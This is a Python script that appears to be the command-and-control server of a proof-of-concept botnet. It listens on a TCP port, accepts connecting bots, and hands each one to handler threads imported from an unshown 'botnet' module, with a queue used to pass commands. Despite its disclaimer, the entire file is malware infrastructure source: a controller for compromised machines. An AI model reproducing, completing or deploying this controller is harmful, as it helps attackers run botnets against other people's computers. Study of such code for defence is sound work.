#!/usr/bin/env python3

"""
Creator:    VPR
Created:    November 21, 2021
Updated:    November 22, 2021

Disclaimer:
    This program was designed as a proof-of-concept. It doesn't do anything
    malicious and it is not intended to do so. Don't try to use it for any
    malicious or illegal activity.
"""

import socket
import sys
import os

from botnet import *
from queue import Queue

q = Queue()

def listener(host: str, port: int, q: Queue) -> None:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server_addr = (host, port)
    server.bind(server_addr)

    server.listen(100)
    sys.stdout.write(f"[+] Listening on tcp://{host}:{port}\n\n")

    botThread = Bot(q)
    botThread.start()

    while True:
        try:
            client, client_address = server.accept()
        except KeyboardInterrupt:
            os._exit(1)

        newThread = BotHandler(client, client_address, q)
        sock_threads.append(newThread)

        newThread.start()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        HOST = "127.0.0.1"
        PORT = 8080
    else:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])

    try:
        listener(HOST, PORT, q)
    except Exception as ex:
        sys.stderr.write(f"[-] Error: {ex}\n")
